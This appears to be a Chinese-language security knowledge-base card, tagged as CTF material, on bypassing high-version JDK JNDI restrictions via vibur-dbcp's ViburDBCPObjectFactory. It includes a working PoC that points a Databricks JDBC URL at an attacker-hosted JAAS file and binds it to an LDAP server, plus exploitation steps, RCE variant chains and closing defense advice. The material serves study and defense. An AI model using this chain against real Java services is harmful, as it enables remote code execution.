---
id: web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc
title: 高版本 JNDI 绕过：ViburDBCPObjectFactory 本地工厂把 Reference 属性转成 JDBC 连接
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-high-version-viburdbcp-objectfactory-jdbc
tags:
- java
- jndi
- ldap
- high-version
- objectfactory
- viburdbcp
- jdbc
- datasource
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:45:45+08:00'
  notes: 已对照原文与42张图逐张核对：JDK 8u201 trustURLCodebase=false 下 NamingManager.getObjectFactoryFromReference 从本地 classpath 加载工厂并强转 ObjectFactory；ViburDBCPObjectFactory.getObjectInstance 把 RefAddr 转 Properties→new ViburDBCPDataSource(props)→start()→ConcurrentPool/ConnectionFactory→Connector$Builder$Driver.connect(jdbcUrl) 与反编译截图及调用栈一致；图41 JNDIMap 日志显示 /Vibur/Exploit→JAAS URL→Malicious JDBC URL→useReferenceOnly，链路成立。未验证点：未本机复跑；原文未给 vibur-dbcp 版本/影响区间，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc/
draft: false
kb_aliases:
- ViburDBCPObjectFactory
- vibur-dbcp JNDI
- JNDI 本地工厂 JDBC
- Reference 属性转 JDBC
- DriverManager 二次入口
- 阿里CTF MHGA
---

## 一句话结论

高版本 JDK 禁止从远程 codebase 加载 JNDI 工厂后，只要目标 classpath 存在 vibur-dbcp，就可以把 `Reference` 的 `factoryClassName` 指向本地 `org.vibur.dbcp.ViburDBCPObjectFactory`：该工厂会把全部 `RefAddr` 转成 `Properties`，构造 `ViburDBCPDataSource` 并调用 `start()`，最终用攻击者可控的 `jdbcUrl`/`driverClassName` 发起 JDBC 连接，把一次 JNDI lookup 变成任意 JDBC URL 的二次入口（可衔接驱动层漏洞直至 RCE）。

## 原理

- JDK 8u191+/高版本的 `VersionHelper12.loadClass(className, codebase)` 只在 `trustURLCodebase=true` 时用 `URLClassLoader` 加载远程工厂类，默认 false，因此“Reference 指向远程 factory 类”的经典 JNDI 利用失效。
- 但 `NamingManager.getObjectFactoryFromReference(ref, factoryName)` 的第一步是 `helper.loadClass(factoryName)`，即从**本地 classpath** `Class.forName` 加载，随后强转并实例化：
  `return (class != null) ? (ObjectFactory) class.newInstance() : null;`。所以任何实现 `javax.naming.spi.ObjectFactory` 的本地类都可作为绕过点。
- vibur-dbcp 提供的 `org.vibur.dbcp.ViburDBCPObjectFactory implements ObjectFactory`，其 `getObjectInstance` 逻辑：
  1. 把 `obj` 强转为 `Reference`，`reference.getAll()` 枚举所有 `RefAddr`；
  2. 以 `refAddr.getType()` 为 key、`(String) refAddr.getContent()` 为 value 填入 `Properties`；
  3. `new ViburDBCPDataSource(props)`，再调用 `dataSource.start()`，最后返回 datasource。
- `ViburDBCPDataSource.start()` 初始化连接池：`ConcurrentPool` 构造 → `addInitialObjects` → `ConnectionFactory.create` → `Connector$Builder$Driver.connect()` → `this.driver.connect(this.jdbcUrl, this.driverProperties)`。其中 `driver`、`jdbcUrl` 与用户名/口令都来自攻击者控制的 Reference 属性。
- 原文调用栈（LDAP 入口）：
  ```text
  connect:72, Connector$Builder$Driver (org.vibur.dbcp.pool)
  create:83, ConnectionFactory (org.vibur.dbcp.pool)
  addInitialObjects:140, ConcurrentPool (org.vibur.objectpool)
  doStart:279, ViburDBCPDataSource (org.vibur.dbcp)
  start:240, ViburDBCPDataSource
  getObjectInstance:49, ViburDBCPObjectFactory
  getObjectInstance:193, DirectoryManager
  c_lookup:1114, LdapCtx
  lookup:409, InitialContext
  ```
- 关键点：整个过程不需要远程类加载，`factoryClassLocation` 可以留空；攻击面从“JNDI 工厂”转移到“本地 classpath 的任意 JDBC 驱动”。如果 `jdbcUrl` 命中一个有 URL 参数注入/反序列化/二次 JNDI 的驱动（如 Databricks `krbJAASFile`、MySQL `autoDeserialize`、H2 `INIT`），就能继续升级到 RCE。原文正是把它接到 CVE-2024-49194 的 Databricks 驱动链上。

## 触发条件

- 存在 JNDI 注入点（`InitialContext.lookup` 的目标可由攻击者控制或其 LDAP/RMI 响应可被伪造）；
- 目标 JDK 为高版本（`trustURLCodebase=false`），但 classpath 含 vibur-dbcp（`org.vibur.dbcp.ViburDBCPObjectFactory` 可被加载）；
- 攻击者可返回带任意 `RefAddr` 的 `Reference`，且目标可出网访问攻击者指定的 JDBC 端点；
- classpath 上的 JDBC 驱动存在危险 URL 参数，或攻击者能伪造数据库服务端以利用驱动协议（否则止步于任意 TCP 连接/SSRF）。

## 利用步骤

1. 确认 JNDI 入口与高版本限制（`com.sun.jndi.ldap.object.trustURLCodebase` 默认 false）。
2. 确认 classpath 有 vibur-dbcp；没有则换其他本地 `ObjectFactory`（Tomcat `ResourceFactory`、c3p0 `JavaBeanObjectFactory`、Hessian `HessianProxyFactory` 等）。
3. 构造 `Reference`：
   - `className` 可为 `javax.sql.DataSource` 等任意占位类；
   - `factoryClassName=org.vibur.dbcp.ViburDBCPObjectFactory`；
   - `factoryClassLocation=null`；
   - 加入 `driverClassName`、`jdbcUrl`、`username`、`password` 等 `StringRefAddr`。
4. 把 `Reference`（或 `ReferenceWrapper`）绑定到攻击者的 LDAP/RMI 服务，诱导目标 lookup。
5. `ViburDBCPObjectFactory.getObjectInstance` 创建并启动连接池，`DriverManager`/驱动用攻击者 URL 建连。
6. 将 JDBC URL 指向带二次利用的驱动参数（例如 Databricks `krbJAASFile=http://attacker/jaas.conf`），继续执行驱动层 JNDI/反序列化链。

## PoC

```java
Reference ref = new Reference(
    "javax.sql.DataSource",
    "org.vibur.dbcp.ViburDBCPObjectFactory",
    null); // factoryClassLocation 为 null，强制走本地 classpath

ref.add(new StringRefAddr("driverClassName", "com.databricks.client.jdbc.Driver"));
ref.add(new StringRefAddr("jdbcUrl",
    "jdbc:databricks://attacker:443/default;transportMode=http;ssl=1;"
  + "httpPath=/sql/1.0/endpoints/12345;AuthMech=1;krbHostFQDN=localhost;"
  + "krbServiceName=spark;krbJAASFile=http://attacker:8000/jaas.conf"));
ref.add(new StringRefAddr("username", "token"));
ref.add(new StringRefAddr("password", "x"));

// LDAP/RMI 服务端
registry.bind("Vibur/Exploit", new ReferenceWrapper(ref));
```

```java
// 受害者
new InitialContext().lookup("ldap://attacker:1389/Vibur/Exploit");
```

原文用 JNDIMap 观察到的服务端日志（节选）：

```text
[LDAP] Received query: /Vibur/Exploit
[Vibur] Triggering ViburDBCPObjectFactory + CVE-2024-49194 Exploit
[Vibur] JAAS config URL: http://192.168.124.16:3456/jaas.conf
[Vibur] Malicious JDBC URL: jdbc:databricks://localhost:443/default;transportMode=http;...
```

## 变体与关联

- 本地工厂可以替换：Tomcat `ResourceFactory`/`BeanFactory`、c3p0 `JavaBeanObjectFactory`、Hessian `HessianProxyFactory`；选择标准是“实现 `ObjectFactory` + 构造/属性 setter 能导向危险 sink”。
- JDBC 驱动侧可替换：Databricks `krbJAASFile`（本卡原文的下一段）、MySQL `autoDeserialize` + `queryInterceptors`、H2 `INIT=RUNSCRIPT`、PostgreSQL `socketFactory` 等。
- 关联 [[web-java-deserialization-jndi-databricks-jdbc-krbjaasfile-jndi]]：本卡在原文中的直接后续，JDBC URL 触发二次 JNDI。
- 关联 [[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]：同样是“本地工厂 + JDBC 连接”的高版本 JNDI 绕过，只是工厂类和驱动不同。
- 关联 [[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]：另一种本地工厂直接走到 `readObject` 的路线。
- 边界：classpath 无 vibur-dbcp 时不成立；目标不可出网或 JDBC 驱动无危险参数时，危害仅到任意 JDBC 连接/SSRF。

## 检测与防御

- 不要将用户可控输入传给 `InitialContext.lookup`；对 JNDI URL、`Reference` 的 className/factoryClassName 做白名单。
- 对 `ObjectFactory` 做类白名单，拒绝 `org.vibur.dbcp.ViburDBCPObjectFactory` 及同类连接池/数据源工厂；移除不必要的 vibur-dbcp 依赖。
- JDBC URL 与 `driverClassName` 不允许外部可控；数据源测试连接功能要鉴权并限制目标网段。
- 出站限制：应用服务器默认禁止访问外部 LDAP/RMI/JDBC 端口，阻断恶意 Reference 服务。
- 检测：JNDI lookup 指向外部地址、Reference 中出现 `vibur` 工厂名、短时间内由 JNDI 触发的 JDBC 建连、连接池 `start()` 调用栈中的异常。
